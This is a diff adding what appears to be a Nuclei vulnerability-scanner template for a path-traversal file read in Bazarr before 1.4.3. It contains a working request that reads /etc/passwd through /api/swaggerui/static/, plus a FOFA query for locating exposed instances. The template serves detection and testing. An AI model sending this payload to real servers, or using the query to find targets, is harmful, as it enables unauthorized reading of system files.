@@ -1,0 +1,50 @@
+id: bazarr-arbitrary-file-read
+
+info:
+  name: Bazarr < 1.4.3 - Arbitrary File Read
+  author: securityforeveryone
+  severity: high
+  description: |
+    Bazarr 1.4.3 and earlier versions have a arbitrary file read vulnerability.
+  reference:
+    - https://github.com/4rdr/proofs/blob/d70b285245ac6e6efc71aa82c4aac8a4c615c29f/info/Bazaar_1.4.3_File_Traversal_via_Filename.md
+    - https://www.bazarr.media/
+  metadata:
+    vendor: morpheus65535
+    product: bazarr
+    fofa-query: title=="Bazarr" && icon_hash="-1983413099"
+  tags: bazarr,lfi
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+
+    matchers:
+      - type: word
+        words:
+          - '<title>Bazarr</title>'
+        internal: true
+
+  - raw:
+      - |
+        GET /api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+
+      - type: status
+        status:
+          - 200
